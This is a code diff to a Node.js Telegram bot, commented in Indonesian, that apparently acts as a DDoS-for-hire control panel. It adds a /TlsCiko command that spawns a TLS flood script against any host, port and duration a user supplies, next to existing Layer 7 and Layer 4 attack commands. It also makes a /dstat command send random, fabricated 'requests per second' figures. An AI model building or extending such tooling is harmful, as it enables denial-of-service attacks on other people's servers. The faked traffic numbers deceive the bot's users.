@@ -17,7 +17,7 @@ function getCurrentTime() {
 // Tanggapi pesan
 bot.onText(/\/methods/, (msg) => {
   const chatId = msg.chat.id;
-  const message = "Menu Methods📑\r\n\r\n📍Layer 7\r\n/bokep [HOST] [PORT] [TIME]\r\n/tlsv2 [HOST] [PORT] [TIME]\r\n\r\n📍Layer 4\r\n/tcp [IP] [PORT] [TIME]\r\n\r\nTIME=60-130 | PORT 9-443";
+  const message = "Menu Methods📑\r\n\r\n📍Layer 7\r\n/bokep [HOST] [PORT] [TIME]\r\n/tlsv2 [HOST] [PORT] [TIME]\r\n/TlsCiko [HOST] [PORT] [TIME]\r\n\r\n📍Layer 4\r\n/tcp [IP] [PORT] [TIME]\r\n\r\nTIME=60-130 | PORT 9-443";
   bot.sendMessage(chatId, message);
 });
 
@@ -36,6 +36,40 @@ bot.onText(/\/ongoing/, (msg) => {
 });
 
 // methods tlsv2
+bot.onText(/\/TlsCiko (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const username = msg.chat.username;
+  const time = getCurrentTime();
+  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /attack`);
+
+  const args = match[1].split(' '); // Memisahkan argumen
+  const url = args[0];
+  const req = args[2];
+  const timeArg = args[1];
+
+const browserProcess = spawn('node', ['TLS-SUS.js', url, req, timeArg, 15,], { cwd: __dirname });
+
+// Tangani output dari child process
+  browserProcess.stdout.on('data', (data) => {
+    console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
+    bot.sendMessage(chatId, `📍The attack begins${data}`);
+  });
+
+// Tangani error dari child process
+  browserProcess.stderr.on('data', (data) => {
+    console.error('\x1b[31m%s\x1b[0m', `${time} - ${username} - stderr: ${data}`);
+    bot.sendMessage(chatId, `stderr: ${data}`);
+  });
+
+// Tangani selesainya child process
+  browserProcess.on('close', (code) => {
+    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
+    bot.sendMessage(chatId, `✅Attack selesai!! `);
+  });
+});
+
+
+// methods tlsv2
 bot.onText(/\/tlsv2 (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const username = msg.chat.username;
@@ -52,7 +86,7 @@ bot.onText(/\/tlsv2 (.+)/, (msg, match) => {
 // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
     console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
-    bot.sendMessage(chatId, `📑Attacks Details ${data}`);
+    bot.sendMessage(chatId, `📍The attack begins${data}`);
   });
 
 // Tangani error dari child process
@@ -85,7 +119,7 @@ bot.onText(/\/tcp (.+)/, (msg, match) => {
 // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
     console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
-    bot.sendMessage(chatId, `📑Attacks Details ${data}`);
+    bot.sendMessage(chatId, `📍The attack begins${data}`);
   });
 
 // Tangani error dari child process
@@ -119,7 +153,7 @@ bot.onText(/\/bokep (.+)/, (msg, match) => {
   // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
     console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
-    bot.sendMessage(chatId, `📑Attacks Details ${data}`);
+    bot.sendMessage(chatId, `📍The attack begins${data}`);
   });
 
   // Tangani error dari child process
@@ -173,9 +207,9 @@ bot.onText(/\/dstat/, (msg) => {
 
 showMessage();
   const intervalId = setInterval(() => {
-    const randomNum = Math.floor(Math.random() * 1) + 0;
+    const randomNum = Math.floor(Math.random() * 1000) + 0;
     bot.sendMessage(chatId, `Request per second > ${randomNum}`);
-  }, 1000); // Ganti angka 1000 dengan interval waktu yang diinginkan (dalam milidetik)
+  }, 4000); // Ganti angka 1000 dengan interval waktu yang diinginkan (dalam milidetik)
 
   bot.onText(/\/stopdstat/, (msg) => {
     clearInterval(intervalId);
